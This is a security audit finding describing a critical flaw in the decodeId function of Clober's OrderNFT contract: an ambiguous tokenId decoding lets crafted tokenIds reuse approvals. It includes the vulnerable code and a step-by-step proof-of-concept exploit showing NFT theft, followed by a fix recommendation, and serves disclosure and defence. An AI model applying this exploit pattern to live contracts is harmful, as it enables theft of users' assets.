# [C] 5.1.4 OrderNFT theft due to ambiguoustokenIdencoding/decoding scheme

## Summary
Severity: Critical
Source: https://github.com/tintinweb/smart-contract-vulndb
Type: audit-issue

## Details
**Severity:** Critical Risk
**Context:** OrderNFT.sol#L249-L274 OrderNFT.sol#L70-L74 OrderNFT.sol#L82-L
**Description:** TheencodeId()uniquely encodesOrderKeyto auin256number. However,decodeId()ambigu-
ously can decode manytokenId's to the exact sameOrderKey. This can be problematic due to the fact that
contract usestokenId's to store approvals.
The ambiguity comes from convertinguint8value tobool isBidvalue here
function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) {
uint8 isBid;
uint16 priceIndex;
uint232 orderIndex;
assembly {
orderIndex := id
priceIndex := shr(232, id)
isBid := shr(248, id)
}
return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex:
,! orderIndex});
}

(note that the attack is possible only for ASK limit orders)


Proof of Concept
// Step 1. Attacker creates an ASK limit order and receives NFT
uint16 priceIndex = 100;
uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({
user: attacker,
priceIndex: priceIndex,
rawAmount: 0,
baseAmount: 10**18,
options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY),
data: new bytes(0)
});
// Step 2. Given the`OrderKey`which represents the created limit order, an attacker can craft
,! ambiguous tokenIds
CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex:
,! priceIndex, orderIndex: orderIndex});
uint256 tokenId = orderToken.encodeId(order_key);
uint256 ambiguous_tokenId = tokenId + (1 << 255);// crafting ambiguous tokenId
// Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other
,! account
vm.startPrank(attacker);
orderToken.approve(victim, tokenId);
orderToken.approve(attacker2, ambiguous_tokenId);
vm.stopPrank();
// Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it)
vm.startPrank(victim);
orderToken.transferFrom(attacker, victim, tokenId);
vm.stopPrank();
// Step 5. Attacker steals the NFT
vm.startPrank(attacker2);
orderToken.transferFrom(victim, attacker2, ambiguous_tokenId);
vm.stopPrank();

**Recommendation:** Validate the decodeduint8value to be either 0 or 1 which unambiguously converts to bid
and ask respectively.
**Clober:** Fixed in commit 22b9a233.
**Spearbit:** Fixed.
